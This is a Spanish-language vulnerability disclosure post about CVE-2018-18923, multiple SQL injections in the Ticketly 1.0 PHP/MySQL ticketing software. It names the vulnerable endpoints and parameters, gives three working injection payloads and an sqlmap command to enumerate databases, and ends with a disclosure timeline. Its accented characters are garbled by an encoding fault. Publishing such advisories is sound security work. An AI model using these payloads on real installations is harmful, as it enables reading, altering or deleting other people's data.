+++
date = "2018-11-05"
title = "CVE-2018-18923 Ticketly 1.0 - M칰ltiples SQL Injections"
author = "Javier Olmedo"
toc = false
+++

En la[entrada anterior](https://hackpuntes.com/cve-2018-18922-ticketly-escalacion-de-privilegios-crear-cuenta-administrador/), hemos visto una vulnerabilidad de[Escalaci칩n de Privilegios](https://www.owasp.org/index.php/Testing_for_Privilege_escalation_\(OTG-AUTHZ-003\))만n[Ticketly 1.0](https://abisoftgt.net/software/6/sistema-de-tickets-y-soporte-con-php-y-mysql), en esta entrada, vamos a ver otras vulnerabilidades que he encontrado en este software, en concreto, m칰ltiples SQL Injections, estas vulnerabilidades맏an sido asociadas al[CVE-2018-18923](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2018-18923).

## Ticketly -CVE-2018-18923

### Ticketly 1.0 - Multiple SQL Injections

[![/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_001.png](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_001.png)](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_001.png)

Ticketly 1.0, es un software de ticketing desarrollado por AbiSoft para ofrecer soporte a los usuarios sobre incidencias en los sistemas, est치 basado en PHP y MySQL.

- 游늰Vulnerabilidad descubierta por[Javier Olmedo](https://twitter.com/JJavierOlmedo)만l**24/07/2018**
- 游눢 Publicada el**05/11/2018**
- 游냍[CVE-2018-18923](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18923)
- 游댕Link del software[Ticketly](https://abisoftgt.net/software/6/sistema-de-tickets-y-soporte-con-php-y-mysql)
- 游뤡Versi칩n vulnerable =**1.0**

## Vector de ataque / Criticidad de la explotaci칩n

### CRITICIDAD -멇릮 CR칈TICA 游릮

A trav칠s de las vulnerabilidades[SQL Injection](https://www.owasp.org/index.php/SQL_Injection), un usuario malintencionado맗odr칤a**leer, modificar o borrar**말nformaci칩n de la base de datos que utiliza la aplicaci칩n, **lanzar comandos al sistema operativo o**맊ausar una[denegaci칩n de servicio](https://es.wikipedia.org/wiki/Ataque_de_denegaci%C3%B3n_de_servicio)맊on el objetivo de**obtener informaci칩n confidencial, escalar privilegios o dejar inoperativa la aplicaci칩n.**

## Par치metros / Recursos vulnerables

En los siguiente recursos se han encontrado par치metros vulnerables a ataques SQL Injection a trav칠s de peticiones POST,만stas peticiones permiten las condiciones`WHERE`, `HAVING`, `ORDER BY`맟`GROUP BY`, lo que permite que sean**f치cilmente explotables**맟**recuperar grandes cantidades de informaci칩n**맋e la base de datos con una sola consulta.

`/action/addproject.php`

Par치metros `description`, `name`, `category_id` y`description`

`/action/addticket.php`

Par치metros `king_id`, `priority_id`, `project_id`, `status_id` y `title`

`/reports.php`

Par치metros `kind_id` y`status_id`

**游눌 Payload 1 (boolean-based blind)**

```txt
name=Test췉 RLIKE (SELECT (CASE WHEN (4632=4632) THEN 0x54657374 ELSE 0x28 END)) AND 춺lrmZ췉=췉lrmZ&description=Test
```

**游눌 Payload 2 (error-based)**

```txt
name=Test췉 AND EXTRACTVALUE(9139,CONCAT(0x5c,0x7176766a71,(SELECT (ELT(9139=9139,1))),0x7178717a71)) AND 춺SZJL췉=췉SZJL&description=Test
```

**游눌 Payload 3 (AND/OR time-based blind)**

```txt
name=Test췉 RLIKE SLEEP(5) AND 춺WkTS췉=췉WkTS&description=Test
```

游닝**Captura de pantalla de SQLmap lanzando el comando**

```bash
sqlmap -r poc.req -p name --dbs
```

[![/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_002.png](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_002.png)](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_002.png)

## Prueba de concepto (PoC)

**1.**먝Si a침adimos el caracter`'` `(%22)`만n el par치metro`name`맖btenemos un**error en la aplicaci칩n**

**1.1 Petici칩n**

[![/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_003.png](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_003.png)](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_003.png)

**1.2 Respuesta**

[![/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_004.png](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_004.png)](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_004.png)

**2.**En cambio, al a침adir dos`'` `(%22%22)`, obtenemos un**c칩digo 200 OK**

**2.1 Petici칩n**

[![/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_005.png](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_005.png)](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_005.png)

**2.2 Respuesta**

[![/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_006.png](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_006.png)](/images/cve-2018-18923-ticketly-multiples-sql-injections/cve-2018-18923-ticketly-multiples-sql-injections_006.png)

## Timeline

- **24/07/2018**Descubrimiento de la vulnerabilidad
- **24/07/2018**Contacto con el desarrollador
- **24/07/2018**El desarrollador marca la vulnerabiliad como pendiente de parcheo
- **02/11/2018**Solicito CVE
- **04/11/2018**ㅁsignaci칩n de CVE-2018-18923 por MITRE
- **05/11/2018**Hago p칰blica la vulnerabilidad

## Referencias

- CVE-MITRE -[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18923](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18923)

Un saludo a todos!!멇릠